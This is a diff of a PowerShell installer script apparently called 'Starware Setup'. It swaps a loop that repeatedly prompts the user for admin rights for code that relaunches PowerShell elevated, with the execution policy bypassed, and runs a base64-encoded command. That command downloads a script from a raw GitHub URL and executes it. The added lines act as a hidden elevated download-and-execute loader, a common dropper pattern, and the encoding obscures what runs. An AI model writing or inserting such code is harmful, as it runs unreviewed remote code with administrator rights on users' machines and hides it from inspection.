@@ -2,65 +2,17 @@
 Write-Host "Starware Setup initialized" -ForegroundColor Blue
 Write-Host "Checking for Administrator privileges..."
 
-# Function to check for administrator privileges
-function Check-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
+# Check for administrator privileges and request elevation if needed
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Command to download and execute the script from the URL
+    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
+    
+    # Encode the command to bypass issues with special characters in the URL
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
 
-# Function to determine the window style to use based on the current PowerShell instance
-function Get-WindowStyle {
-    try {
-        $process = Get-Process -id $PID
-        $mainWindowHandle = $process.MainWindowHandle
-
-        # Check if the window handle is zero, which is typically the case for hidden windows
-        if ($mainWindowHandle -eq 0) {
-            return "Hidden"
-        } else {
-            return "Normal"
-        }
-    } catch {
-        return "Hidden"  # Default to Hidden if any error occurs
-    }
-}
-
-# Path for the flag file (temp directory which is generally writable without admin rights)
-$flagPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "admin_script_flag.txt")
-
-# Load necessary .NET assembly for using Windows Forms MessageBox
-Add-Type -AssemblyName System.Windows.Forms
-
-# Function to attempt to run the script as admin with conditional window style
-function Invoke-Admin {
-    $script = $MyInvocation.MyCommand.Definition
-    $encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
-    $windowStyle = Get-WindowStyle
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle $windowStyle -EncodedCommand $encodedScript" -Verb RunAs
-}
-
-# Loop until an elevated instance has started or this script is killed
-while ($true) {
-    if (Check-Admin) {
-        # Create a flag file to indicate this instance is running with admin privileges
-        [System.IO.File]::WriteAllText($flagPath, "running")
-        break
-    } else {
-        if ([System.IO.File]::Exists($flagPath)) {
-            # If flag file exists, an admin instance is already running, exit this instance
-            exit
-        }
-        # Display a Windows Message Box asking for administrator privileges
-        $message = "This script requires administrator privileges. Please allow admin access."
-        $caption = "Admin Required"
-        [System.Windows.Forms.MessageBox]::Show($message, $caption, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
-        
-        # Attempt to restart this script with admin privileges and conditional window style
-        Invoke-Admin
-
-        # Wait a bit to avoid rapid repetitive prompts and give the user time to respond to UAC
-        Start-Sleep -Seconds 20
-    }
+    # Restart PowerShell as Administrator and execute the encoded command
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
+    exit # Exits the current, non-administrative script instance
 }
 
 # This part will only execute if already running with admin rights
